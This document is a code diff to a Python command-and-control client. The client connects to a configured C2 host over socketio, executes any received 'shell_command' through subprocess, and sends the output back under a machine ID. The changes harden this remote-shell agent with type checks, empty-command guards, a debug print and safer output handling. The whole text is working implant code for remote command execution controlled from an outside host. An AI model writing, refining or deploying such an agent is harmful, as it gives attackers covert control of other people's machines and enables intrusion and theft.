@@ -1,5 +1,4 @@
 import subprocess
-import threading
 import socketio
 import time
 from config import C2_HOST, C2_PORT, MACHINE_ID
@@ -17,7 +16,18 @@ def make_client():
     @sio.on("shell_command")
     def on_command(data):
         """Receive command from C2, run it, send output back."""
+        print(f"[debug] data={data!r}  type={type(data)}")  # temporary debug line
+
+        # Guard: data must be a dict with a "command" key
+        if not isinstance(data, dict):
+            sio.emit("shell_output", {"machine": MACHINE_ID, "output": f"[error] unexpected data type: {type(data)}"})
+            return
+
         command = data.get("command", "")
+        if not command:
+            sio.emit("shell_output", {"machine": MACHINE_ID, "output": "[error] empty command received"})
+            return
+
         try:
             result = subprocess.run(
                 command,
@@ -26,7 +36,7 @@ def make_client():
                 text=True,
                 timeout=10
             )
-            output = result.stdout + result.stderr
+            output = (result.stdout or "") + (result.stderr or "")
         except subprocess.TimeoutExpired:
             output = "[timeout]"
         except Exception as e:
